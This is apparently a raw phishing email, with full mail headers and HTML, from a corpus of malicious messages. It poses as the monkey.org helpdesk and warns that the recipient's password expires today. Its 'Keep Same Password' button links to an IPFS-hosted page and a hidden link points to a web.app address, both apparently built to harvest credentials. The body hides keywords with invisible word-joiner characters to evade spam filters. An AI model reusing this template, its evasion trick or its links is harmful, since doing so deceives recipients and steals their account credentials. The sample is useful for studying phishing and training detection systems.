@@ -1,0 +1,127 @@
+Return-Path: HELPDESK@monkey.org
+Delivered-To: jose@monkey.org
+X-FDA: 80246143446.52.BFB4A07
+Received: from s-qx.live (s-qx.live [93.84.115.153])
+	by imf15.b.hostedemail.com (Postfix) with ESMTP id 8553510D497C1
+	for <jose@monkey.org>; Thu, 15 Dec 2022 23:33:02 +0000 (UTC)
+From: monkey.org <HELPDESK@monkey.org>
+To: jose@monkey.org
+Subject: Rectify Your Password With monkey.org
+Date: 15 Dec 2022 18:33:00 -0500
+Message-ID: <20221215183300.C0292C75BC4F076D@monkey.org>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+ARC-Authentication-Results: i=1;	imf15.b.hostedemail.com;	dkim=none;
+	dmarc=none;	spf=softfail (imf15.b.hostedemail.com: 93.84.115.153 is neither
+ permitted nor denied by domain of HELPDESK@monkey.org)
+ smtp.mailfrom=HELPDESK@monkey.org
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1671147182;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=aZT8Wt/3eUsJv8iERPN3aGZqUbHjh8dIVaHYmbn5CJw=;
+	b=OJwJ+W2TlHot6IbJp1WJhvEsIIhetB5RF5S3imuu6JsPd3GExDojZfQaT1RmfjqDoI/WX/
+	O2aadNQLFIDS3tUE0LBmRZfO1sQeCRkhKFkzvClUZKwrxV42+VbBZq5PTErAxb7/WZ38Kg
+	KvEK4ODPEC4FZ2CaztheNvUJw07AiKs=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1671147182; a=rsa-sha256;
+	cv=none;
+	b=IIl4GB7l0G2wAIQoExUUF93+6fOrUMV6YmhEsod/iK8bHBalmaWhc9HMI5aHM/vTKXNLnj
+	XjnffJ9j+e7R38hmP1DglSu/VscIeacviR8IU4zfMEoxQdG2NhehBg2zn86+hKfgun5n7W
+	vuc6V4Swk2DMgMFnGJGWXGdti2A9U7E=
+X-Rspamd-Server: rspam06
+X-Rspam-User: 
+Authentication-Results: imf15.b.hostedemail.com;	dkim=none;	dmarc=none;
+	spf=softfail (imf15.b.hostedemail.com: 93.84.115.153 is neither permitted nor
+ denied by domain of HELPDESK@monkey.org) smtp.mailfrom=HELPDESK@monkey.org
+X-Spam-Status: Yes, score=12.74
+X-Rspamd-Queue-Id: 8553510D497C1
+X-Stat-Signature: oqigdfniaccf1brmfd7m1539pogacroa
+X-HE-Tag: 1671147182-154074
+X-HE-Meta: =?utf-8?q?U2FsdGVkX19EqqYH0jKY2r6MJa73mzvq8CvZlCkzuXaaX1lTuPJbm8l?=
+ =?utf-8?q?MeOegl8ms1RUsFKJRw+cR0eMqIJkCMMrDxF9ipuU/GlF5yX/t5tXEYeHAFKfInZx2?=
+ =?utf-8?q?llvJEFfct2iSgiqGwJo4tKsZvQfqsIf/kKJCSBIN3dfKCSN3xwQCQA5umViSI3YqY?=
+ =?utf-8?q?XyXuXvrAuQEL624p88U+0xBR6Pxx9PsU1LWigd+vYyiBSmdBS2sbT/Ls1Ydxz2stC?=
+ =?utf-8?q?MsC92ab36U7ffsa6HUV+Viqi64lc58v8Oll/19mqh59oSSP+66/tmkKNfniCINsPb?=
+ =?utf-8?q?VlJFx5aztCGrkY3YjkshJxUJmh2ZRTQm6nWrmyq4XGe1uuCHidykgtp0o3Y8kXhVm?=
+ =?utf-8?q?e8yx55/O1Gr6rOr8fjvEhdfwH3RvoYUbCCClm5ZrKAKyOMBXrl0cj8vLvl4E7kHv8?=
+ =?utf-8?q?nvKt3ZG01J0oOBOOQ18Dag+YM/w7VdGUI6smP8WtP0KGDLhWQyX+HIIdQB6YylM3H?=
+ =?utf-8?q?zmP97UHJfP4GiU4Sutf7BmFmwGigvlQMtwkCsGKXCwewKmhu04CsTHY/A8ldeiIRp?=
+ =?utf-8?q?8GGXS9+6rNqbTiW6lV6RNiBa/6X3k3xKnKD7neD0CmOM6D0Vdi7XyK+6GQMCk5mOF?=
+ =?utf-8?q?zU+12/GjSSIVJoBobD5QKbgSUlJmF8h9xC4ODlXlmnUuLtJtHGbAx8wiSqmdQnGbL?=
+ =?utf-8?q?zi1WsDSpPs56aTZO5YMCKyB867zXW5BRhBayrnSl7v8ZqvELxHE2hqpdZnsID/Q+Y?=
+ =?utf-8?q?wk3A8wEuBekoEswwt7t0RWL8Ku51U3oECCC86oYsULJ1aRR815ZT0YDOeyFfqhbwS?=
+ =?utf-8?q?vjmBWSP9vSwR7KiOKxtHc2IgJSLEgtCtNNzbdpSqPTkzdid4RhtvmX44p7C9GPBpu?=
+ =?utf-8?q?srM7/96r/TPyonpiuOdbWqYTR6Wlhkx5Qj/W8nTKFzyDVvD/o1nL9jZ35jdDy1NlP?=
+ =?utf-8?q?6b8C7tRpeohASHw0ywRvA3_oAZaTUdXwdlS8idvjGxjPhay0evYv+v5gtVy2K8l5d?=
+ =?utf-8?q?T47jUsYomZVFT+1S6NmfcFHxyAf346u+1ftsG7nxZfugb0ifyfZEenXc5XA3ekmLo?=
+ =?utf-8?q?Y2NhvxBHuc68nhgoo6eMX7Uz9wJXSNFmj8FHgeB8MEyqUmKOeCKD86aJYKBzNHeEn?=
+ =?utf-8?q?n4w/JrAS613wXNDRunHZyfi7cBakTPy1ZXtPEQrP1w183/rv1dgSc6I4jv7UybMQz?=
+ =?utf-8?q?TYS+7vj3fl8qE9kjHJDDljxEuf/3z9qAeALkgzq9wEopgSPIkj47uvO3cAkJgpvJy?=
+ =?utf-8?q?vs=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 239
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY style=3D"MARGIN: 0.5em">
+<P><STRONG><FONT color=3D#ff0000 size=3D5 face=3DArial>
+monkey.org&nbsp;<BR style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetic=
+a, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; W=
+IDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures:=
+ normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-de=
+coration-thickness: initial; text-decoration-style: initial; text-decoratio=
+n-color: initial"></FONT></STRONG></P>
+<P style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West E=
+uropean)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetic=
+a Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM=
+: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: normal; ORPHANS=
+: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-liga=
+tures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; t=
+ext-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial'>Hi jose,<BR=
+>Pa&#8288;s&#8288;sword for&#8288;&nbsp;jose@monkey.org&#8288; Will Expire =
+T&#8288;od&#8288;ay<BR>u&#8288;se cu&#8288;rren&#8288;t pa&#8288;ssword to =
+continue for jose@monkey.org<BR><BR>
+<A style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN=
+: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(0,102,147); PADDING-BOTTOM=
+: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px=
+; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(245,245,245); font-variant-n=
+umeric: inherit; font-variant-east-asian: inherit; font-stretch: inherit" h=
+ref=3D"https://systemlogin-alert.web.app/index.html?#accounts@megaflour.com=
+=2Emy" rel=3Dnoopener target=3D_blank=20
+data-auth=3D"NotApplicable" data-linkindex=3D"0"></A></P>
+<A style=3D'BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI=
+", "Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSyste=
+mFont, Roboto, "Helvetica Neue", sans-serif; BORDER-RIGHT-WIDTH: 0px; VERTI=
+CAL-ALIGN: baseline; WHITE-SPACE: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SP=
+ACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,102,147); =
+PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0p=
+x; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px;=20
+LETTER-SPACING: normal; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROU=
+ND-COLOR: rgb(245,245,245); TEXT-INDENT: 0px; font-variant-ligatures: norma=
+l; font-variant-caps: normal; -webkit-text-stroke-width: 0px; font-variant-=
+numeric: inherit; font-variant-east-asian: inherit; font-stretch: inherit' =
+href=3D"https://ipfs.fleek.co/ipfs/bafybeidw4fgr7lqa2wx67n4ywiwpbum3ocjxgh2=
+3a3bfee3e3e7hq45pj4#jose@monkey.org" rel=3Dnoopener target=3D_blank data-au=
+th=3D"NotApplicable" data-linkindex=3D"0">
+<DIV id=3Dx_Z32B style=3D"BORDER-LEFT-WIDTH: 0px; HEIGHT: 34px; BORDER-RIGH=
+T-WIDTH: 0px; WIDTH: 172px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: =
+0px; COLOR: rgb(255,255,255); PADDING-BOTTOM: 7px; PADDING-TOP: 7px; PADDIN=
+G-LEFT: 7px; MARGIN: 0px; DISPLAY: inline-block; PADDING-RIGHT: 7px; BORDER=
+-TOP-WIDTH: 0px; BACKGROUND-COLOR: blue">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0=
+px">Ke&#8288;e&#8288;p Sa&#8288;me&#8288; Pa&#8288;ss&#8288;wor&#8288;d&#82=
+88;</DIV></DIV></A></BODY></HTML>
+
